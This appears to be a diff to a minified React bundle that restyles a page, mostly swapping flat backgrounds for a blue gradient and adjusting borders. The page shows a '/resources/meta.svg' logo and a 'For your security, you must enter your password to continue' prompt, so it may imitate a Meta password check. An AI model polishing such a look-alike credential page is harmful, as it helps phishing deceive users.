@@ -8929,7 +8929,8 @@
               left: 0,
               right: 0,
               bottom: 0,
-              backgroundColor: "rgb(245, 255, 250)",
+              background:
+                "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
             },
             content: {
               position: "absolute",
@@ -10789,7 +10790,8 @@
           }, []);
           return (0, c.jsxs)("div", {
             style: {
-              backgroundColor: "#F5FFFA",
+              background:
+                "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
               height: "100vh",
             },
             children: [
@@ -10797,7 +10799,8 @@
                 className: "header",
                 style: {
                   borderSizing: "border-box",
-                  backgroundColor: "#F5FFFA",
+                  background:
+                    "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
                   boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
                 },
                 children: (0, c.jsx)("div", {
@@ -10920,24 +10923,12 @@
             [y, b] = e.useState(0);
           let w;
           return (0, c.jsxs)("div", {
-            style: { backgroundColor: "#F5FFFA", height: "100vh" },
+            style: {
+              background:
+                "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+              height: "100vh",
+            },
             children: [
-              (0, c.jsx)("div", {
-                className: "header",
-                style: {
-                  borderSizing: "border-box",
-                  backgroundColor: "#FFFFFF",
-                  boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
-                },
-                children: (0, c.jsx)("div", {
-                  style: { paddingTop: 15, paddingLeft: 30, paddingBottom: 10 },
-                  children: (0, c.jsx)("img", {
-                    src: "/resources/meta.svg",
-                    alt: "",
-                    height: 15,
-                  }),
-                }),
-              }),
               (0, c.jsx)("div", {
                 className: "body",
                 style: {
@@ -11164,6 +11155,7 @@
             left: "50%",
             right: "auto",
             bottom: "auto",
+            borderRadius: 20,
             marginRight: "-50%",
             transform: "translate(-50%, -50%)",
             width: "80%",
@@ -11217,8 +11209,8 @@
               paddingRight: 15,
               paddingBottom: 40,
               background:
-                "bg-gradient-to-tr from-light-green-600 to-light-green-400",
-              borderRadius: 15,
+                "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+              borderRadius: 20,
               boxShadow: "0px 0px",
             },
             children: [
@@ -11262,6 +11254,7 @@
                     children:
                       "For your security, you must enter your password to continue.",
                   }),
+
                   (0, c.jsxs)("div", {
                     className: "",
                     children: [
@@ -11284,6 +11277,12 @@
                         color: "gray",
                       }),
                     ],
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "1px solid #d0d0d0",
+                      marginTop: 30,
+                    },
                   }),
                   (0, c.jsxs)("div", {
                     style: {
@@ -11453,6 +11452,7 @@
                   width: "100%",
                   style: {
                     borderRadius: "30px",
+                    border: "1px solid #d0d0d0",
                   },
                 }),
               }),
@@ -11707,14 +11707,18 @@
           }, []),
           1 === t
             ? (0, c.jsxs)("div", {
-                style: { background: "#F5FFFA" },
+                style: {
+                  background:
+                    "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+                },
                 children: [
                   (0, c.jsx)("div", {
                     style: {
                       paddingTop: 30,
                       paddingLeft: 30,
                       paddingBottom: 30,
-                      backgroundColor: "#F5FFFA",
+                      background:
+                        "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
                     },
                     children: (0, c.jsx)("img", {
                       src: "/resources/meta.svg",
